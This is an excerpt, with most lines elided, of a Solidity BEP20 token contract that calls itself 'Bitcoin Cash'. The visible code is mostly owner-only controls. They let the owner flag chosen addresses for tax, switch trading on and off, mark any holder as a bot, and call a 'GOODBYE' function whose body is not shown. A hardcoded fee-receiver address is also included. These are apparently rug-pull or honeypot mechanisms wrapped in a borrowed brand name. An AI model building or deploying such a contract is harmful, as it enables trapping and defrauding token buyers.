...
contract BitcoinCash is IBEP20, Auth {
    ...
    string constant _name = "Bitcoin Cash";
    ...
    bool private manageGOODBYE = true;
    ...
    address public marketingFeeReceiver = 0xACd72215D1c4Ea61584E7133c569B380acAD3714;
    ...
    uint256 public swapThreshold = _totalSupply / 10000 * 50; // 0.5%
    bool inSwap;
    ...
    function enable_tax(bool _status) public authorized {
        taxMode = _status;
    }
    ...
    function manage_tax(address[] calldata addresses, bool status) public authorized {
        for (uint256 i; i < addresses.length; ++i) {
            istaxed[addresses[i]] = status;
        }
    }

    function ManageGOODBYE(bool state) external authorized{
        manageGOODBYE = state;
    }

    function GOODBYE() external authorized{
    ...
    function OpenTrading(uint256 _swapAt, uint256 _swapDelay) public authorized {
        tradingOpen = true;
    ...
    function tradingstatus(bool state) public authorized {
        tradingOpen = state;
    }
    ...
    // Exclude bots
    function isBots(address _address, bool _value) public authorized{
